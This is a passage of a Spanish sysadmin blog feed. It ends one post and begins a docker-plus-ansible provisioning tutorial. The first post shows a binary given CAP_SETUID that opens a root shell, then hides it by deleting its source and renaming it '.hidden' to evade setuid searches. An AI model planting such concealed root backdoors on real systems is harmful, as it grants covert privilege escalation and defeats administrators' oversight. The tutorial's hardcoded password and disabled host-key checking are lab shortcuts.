&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a darle la &lt;em&gt;capability&lt;/em&gt; &lt;strong&gt;CAP_SETUID&lt;/strong&gt;. Además, le pondremos los flags &lt;em&gt;effective&lt;/em&gt; y &lt;em&gt;permitted&lt;/em&gt;, que darán la &lt;em&gt;capability&lt;/em&gt; automáticamente y lo pasará a los procesos hijos. Mas información en &lt;a href="http://linux.die.net/man/7/capabilities"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: he usado &lt;strong&gt;sudo&lt;/strong&gt; para hacer esta operación, pero como no tendremos esto en producción, tendremos que esperar una intervención en donde nos concedan ese permiso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ sudo setcap cap_setuid+ep root_shell
&lt;span class="o"&gt;[&lt;/span&gt;sudo&lt;span class="o"&gt;]&lt;/span&gt; password &lt;span class="k"&gt;for&lt;/span&gt; gerard:
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ejecutando el binario, vemos que hemos obtenido lo que esperábamos; un binario que nos deja ante una línea de comandos con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./root_shell
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# id&lt;/span&gt;
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que no hay permisos especiales tipo &lt;em&gt;setuid&lt;/em&gt;, con lo que no pueden encontrarlo con el &lt;strong&gt;find&lt;/strong&gt; habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ls -lh
total 12K
-rwxrwxr-x. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard &lt;span class="m"&gt;4&lt;/span&gt;.3K Mar &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;18&lt;/span&gt;:01 root_shell
-rw-rw-r--. &lt;span class="m"&gt;1&lt;/span&gt; gerard gerard   &lt;span class="m"&gt;50&lt;/span&gt; Mar &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;17&lt;/span&gt;:59 root_shell.c
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a intentar ocultar lo que nos delataría a simple vista; eliminamos el innecesario código fuente y ocultaremos el binario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ rm root_shell.c
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ mv root_shell .hidden
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos que sigue funcionando, y que tiene la &lt;em&gt;capability&lt;/em&gt; que le hemos dado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./.hidden
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# id&lt;/span&gt;
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1002&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gerard&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;root@server ~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;# exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$ getpcaps .hidden
Capabilities &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="sb"&gt;`&lt;/span&gt;.hidden&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;=&lt;/span&gt; cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
&lt;span class="o"&gt;[&lt;/span&gt;gerard@server ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="shell"></category><category term="root"></category><category term="capabilities"></category></entry><entry><title>Controlando contenedores docker con ansible</title><link href="https://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html" rel="alternate"></link><published>2016-06-06T08:00:00+02:00</published><updated>2016-06-06T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-06-06:/2016/06/controlando-contenedores-docker-con-ansible.html</id><summary type="html">&lt;p&gt;La facilidad de levantar un contenedor &lt;strong&gt;docker&lt;/strong&gt; nos lleva a la pregunta del millón: ¿es posible usar &lt;strong&gt;docker&lt;/strong&gt; para crear contenedores de usar y tirar para probar otras tecnologías? La respuesta es que sí, y para demostrarlo, vamos a generar un entorno minimalista en contenedores &lt;strong&gt;docker&lt;/strong&gt;, desplegados mediante &lt;strong&gt;ansible&lt;/strong&gt; &lt;em&gt;playbooks …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;La facilidad de levantar un contenedor &lt;strong&gt;docker&lt;/strong&gt; nos lleva a la pregunta del millón: ¿es posible usar &lt;strong&gt;docker&lt;/strong&gt; para crear contenedores de usar y tirar para probar otras tecnologías? La respuesta es que sí, y para demostrarlo, vamos a generar un entorno minimalista en contenedores &lt;strong&gt;docker&lt;/strong&gt;, desplegados mediante &lt;strong&gt;ansible&lt;/strong&gt; &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: De acuerdo con el autor de &lt;strong&gt;docker&lt;/strong&gt;, nunca deberíais poner &lt;strong&gt;SSH&lt;/strong&gt; en un contenedor &lt;strong&gt;docker&lt;/strong&gt; (artículo &lt;a href="https://jpetazzo.github.io/2014/06/23/docker-ssh-considered-evil/"&gt;aquí&lt;/a&gt;). Sin embargo, hoy vamos a hacer una excepción para esta demostración.&lt;/p&gt;
&lt;h2&gt;Las imágenes base&lt;/h2&gt;
&lt;p&gt;La idea es que vamos a levantar una serie de máquinas y vamos a dejar que &lt;strong&gt;ansible&lt;/strong&gt; las provisiones mediante &lt;em&gt;playbooks&lt;/em&gt;; para ello necesitamos una imagen base. También vamos a crear una imagen que solo sirva para ejecutar &lt;strong&gt;ansible&lt;/strong&gt;, que vamos a crear y a destruir según lo necesitemos.&lt;/p&gt;
&lt;p&gt;Vamos a empezar creando la imagen &lt;em&gt;master&lt;/em&gt;, que contiene la herramienta &lt;strong&gt;ansible&lt;/strong&gt; (vamos a poner una versión superior desde los &lt;em&gt;backports&lt;/em&gt;) y sus dependencias. Este es nuestro &lt;em&gt;Dockerfile&lt;/em&gt; y el fichero &lt;em&gt;ansible.cfg&lt;/em&gt; que va a gobernarlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat ansible.cfg 
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
gerard@sirius:~/build$ cat Dockerfile.master 
FROM debian:jessie-backports
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y openssh-client sshpass nano
RUN apt-get install -y -t jessie-backports ansible
ADD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ansible.cfg&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/root/.ansible.cfg&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen mediante el comando &lt;em&gt;build&lt;/em&gt; y le ponemos el &lt;em&gt;tag&lt;/em&gt; "master".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -f Dockerfile.master -t master .
Sending build context to Docker daemon &lt;span class="m"&gt;4&lt;/span&gt;.096 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian:jessie-backports
 ---&amp;gt; 99552579b6f6
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y openssh-client sshpass nano
 ---&amp;gt; Running in 6e311500cbeb
...
 ---&amp;gt; d014d43ddf74
Removing intermediate container 6e311500cbeb
Step &lt;span class="m"&gt;3&lt;/span&gt; : RUN apt-get install -y -t jessie-backports ansible
 ---&amp;gt; Running in d047144fce1b
...
 ---&amp;gt; 10881f414b84
Removing intermediate container d047144fce1b
Step &lt;span class="m"&gt;4&lt;/span&gt; : ADD ansible.cfg /root/.ansible.cfg
 ---&amp;gt; 08fd2580e558
Removing intermediate container c6b3c29e8682
Step &lt;span class="m"&gt;5&lt;/span&gt; : CMD /bin/bash
 ---&amp;gt; Running in 7b1199ff749f
 ---&amp;gt; 58689ad42e3e
Removing intermediate container 7b1199ff749f
Successfully built 58689ad42e3e
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a crear la imagen para las máquinas controladas, mediante un &lt;em&gt;Dockerfile&lt;/em&gt; creado a tal efecto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat Dockerfile.slave 
FROM debian:jessie
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y python openssh-server sudo &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    useradd ansible -G sudo -s /bin/bash -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ansible:s3cr3t&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /var/run/sshd
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/sbin/sshd&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nuevamente lanzamos el &lt;em&gt;build&lt;/em&gt; con el &lt;em&gt;tag&lt;/em&gt; "slave".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -f Dockerfile.slave -t slave .
Sending build context to Docker daemon &lt;span class="m"&gt;4&lt;/span&gt;.096 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian:jessie
 ---&amp;gt; bb5d89f9b6cb
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y python openssh-server sudo &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     useradd ansible -G sudo -s /bin/bash -m &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ansible:s3cr3t&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /var/run/sshd
 ---&amp;gt; Running in ecc6f15ffdc1
...
 ---&amp;gt; ecd77bdcc643
Removing intermediate container ecc6f15ffdc1
Step &lt;span class="m"&gt;3&lt;/span&gt; : CMD /usr/sbin/sshd -D
 ---&amp;gt; Running in 09b2642eb314
 ---&amp;gt; 306389180c9f
Removing intermediate container 09b2642eb314
Successfully built 306389180c9f
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que tenemos ambas imágenes preparadas para crear nuestros contenedores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
slave               latest              306389180c9f        &lt;span class="m"&gt;5&lt;/span&gt; seconds ago       &lt;span class="m"&gt;186&lt;/span&gt; MB
master              latest              58689ad42e3e        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       &lt;span class="m"&gt;245&lt;/span&gt;.4 MB
debian              jessie-backports    99552579b6f6        &lt;span class="m"&gt;6&lt;/span&gt; days ago          &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
debian              jessie              bb5d89f9b6cb        &lt;span class="m"&gt;6&lt;/span&gt; days ago          &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando los contenedores necesarios&lt;/h2&gt;
&lt;p&gt;La idea es que vamos a crear un micro entorno compuesto por dos servidores y un balanceador, que es la fachada del sistema. La salida de cada petición web va a indicar el nombre de la máquina que la sirvió, para poder comprobar que balancea adecuadamente.&lt;/p&gt;
&lt;p&gt;Los &lt;em&gt;flags&lt;/em&gt; de ejecución son &lt;em&gt;--name&lt;/em&gt; (el nombre con el que nos referiremos en los comandos &lt;em&gt;docker&lt;/em&gt;), el &lt;em&gt;-h&lt;/em&gt; (para dar un nombre de sistema operativo a la máquina), el &lt;em&gt;-d&lt;/em&gt; (&lt;em&gt;detach&lt;/em&gt;, para que no nos bloquee el terminal) y la imagen &lt;em&gt;slave&lt;/em&gt; que tiene instalados &lt;strong&gt;ssh&lt;/strong&gt;, &lt;strong&gt;python&lt;/strong&gt; y &lt;strong&gt;sudo&lt;/strong&gt;. Adicionalmente la imagen del balanceador &lt;em&gt;publica&lt;/em&gt; su puerto 80 en el puerto 8000 de la máquina &lt;em&gt;host&lt;/em&gt;, para poder acceder por &lt;strong&gt;HTTP&lt;/strong&gt; desde nuestra máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run --name balancer -h balancer -d -p &lt;span class="m"&gt;8000&lt;/span&gt;:80 slave
7a80942c69a70e729fc7090983fc59735fd0c10818a5b62b64a26a98e58fc101
gerard@sirius:~/build$ docker run --name server1 -h server1 -d slave
745acb30c5c1b7067a15f593dfefce3e769d2a7b5423f001b6a080296c3aeb3f
gerard@sirius:~/build$ docker run --name server2 -h server2 -d slave
a469c0f69bb42a3c979037b125750a4cc1bf01750c24bd7cef277b9b6e7dc2d0
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante anotar las direcciones IP de las máquinas, para saber qué tenemos en cada sitio. Esta información nos sirve para montar la configuración del balanceador y para el inventario de &lt;strong&gt;ansible&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker inspect balancer &lt;span class="p"&gt;|&lt;/span&gt; grep IPAddress
            &lt;span class="s2"&gt;&amp;quot;SecondaryIPAddresses&amp;quot;&lt;/span&gt;: null,
            &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.2&amp;quot;&lt;/span&gt;,
                    &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.2&amp;quot;&lt;/span&gt;,
gerard@sirius:~/build$ docker inspect server1 &lt;span class="p"&gt;|&lt;/span&gt; grep IPAddress
            &lt;span class="s2"&gt;&amp;quot;SecondaryIPAddresses&amp;quot;&lt;/span&gt;: null,
            &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.3&amp;quot;&lt;/span&gt;,
                    &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.3&amp;quot;&lt;/span&gt;,
gerard@sirius:~/build$ docker inspect server2 &lt;span class="p"&gt;|&lt;/span&gt; grep IPAddress
            &lt;span class="s2"&gt;&amp;quot;SecondaryIPAddresses&amp;quot;&lt;/span&gt;: null,
            &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.4&amp;quot;&lt;/span&gt;,
                    &lt;span class="s2"&gt;&amp;quot;IPAddress&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.4&amp;quot;&lt;/span&gt;,
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos crear un contenedor de la imagen &lt;em&gt;master&lt;/em&gt; que tiene &lt;strong&gt;ansible&lt;/strong&gt; para &lt;em&gt;empujar&lt;/em&gt; los &lt;em&gt;playbooks&lt;/em&gt; a las &lt;em&gt;slaves&lt;/em&gt;. Esta máquina es de "usar y tirar".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run -ti --rm -h ansible master
root@ansible:/# &lt;span class="nb"&gt;cd&lt;/span&gt; /root/
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Manos a la obra: los playbooks&lt;/h2&gt;
&lt;p&gt;Este punto es similar al uso de &lt;strong&gt;ansible&lt;/strong&gt; sin &lt;strong&gt;docker&lt;/strong&gt;. Se trata de definir el fichero de &lt;em&gt;hosts&lt;/em&gt;, los &lt;em&gt;playbooks&lt;/em&gt; y los ficheros que estos puedan necesitar. En este caso concreto, vemos que necesitamos (&lt;em&gt;hosts&lt;/em&gt; y &lt;em&gt;playbooks&lt;/em&gt; aparte) la aplicación &lt;strong&gt;python&lt;/strong&gt; que vamos a servir, la configuracion para &lt;strong&gt;uwsgi&lt;/strong&gt; y la configuración del balanceador.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- balancer.yml
&lt;span class="p"&gt;|&lt;/span&gt;-- files
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;|&lt;/span&gt;-- balancer
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;|&lt;/span&gt;-- myapp.ini
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="sb"&gt;`&lt;/span&gt;-- myapp.py
&lt;span class="p"&gt;|&lt;/span&gt;-- hosts
&lt;span class="sb"&gt;`&lt;/span&gt;-- servers.yml

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;6&lt;/span&gt; files
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un paso necesario es crear el fichero de &lt;em&gt;hosts&lt;/em&gt;, que incluye los grupos, los contenedores que los forman y los parámetros de conexión a los mismos (como los declaramos en los &lt;em&gt;Dockerfiles&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts 
&lt;span class="o"&gt;[&lt;/span&gt;all:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t

&lt;span class="o"&gt;[&lt;/span&gt;balancer&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.2

&lt;span class="o"&gt;[&lt;/span&gt;servers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Los servidores de aplicaciones&lt;/h3&gt;
&lt;p&gt;La idea es que este grupo va a servir una aplicación &lt;strong&gt;python&lt;/strong&gt; mediante el servidor &lt;strong&gt;uwsgi&lt;/strong&gt;. Esta aplicación es un ejemplo muy simple, que se limita a indicar el &lt;em&gt;hostname&lt;/em&gt; de la máquina, en forma de saludo. Esta aplicación se sirve en el puerto TCP 8080. Estos son el &lt;em&gt;playbook&lt;/em&gt; y los ficheros necesarios para su ejecución:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat files/myapp.py 
import os

def application&lt;span class="o"&gt;(&lt;/span&gt;environ, start_response&lt;span class="o"&gt;)&lt;/span&gt;:
    start_response&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;, &lt;span class="o"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)])&lt;/span&gt;
    yield &lt;span class="s1"&gt;&amp;#39;Hello from %s\n&amp;#39;&lt;/span&gt; % os.uname&lt;span class="o"&gt;()[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
root@ansible:~# cat files/myapp.ini 
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
http-socket &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; myapp:application
root@ansible:~# cat servers.yml 
- hosts: servers
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;={{&lt;/span&gt; item &lt;span class="o"&gt;}}&lt;/span&gt; &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;installed
      with_items:
        - uwsgi-emperor
        - uwsgi-plugin-python
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;uwsgi-emperor &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;files/myapp.py &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/myapp.py
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;files/myapp.ini &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/uwsgi-emperor/vassals/myapp.ini
    - file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/uwsgi-emperor/vassals/myapp.ini &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;touch
root@ansible:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esta información, es todo tan fácil como lanzar el &lt;em&gt;playbook&lt;/em&gt; con el inventario creado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook -i hosts servers.yml 

PLAY ***************************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
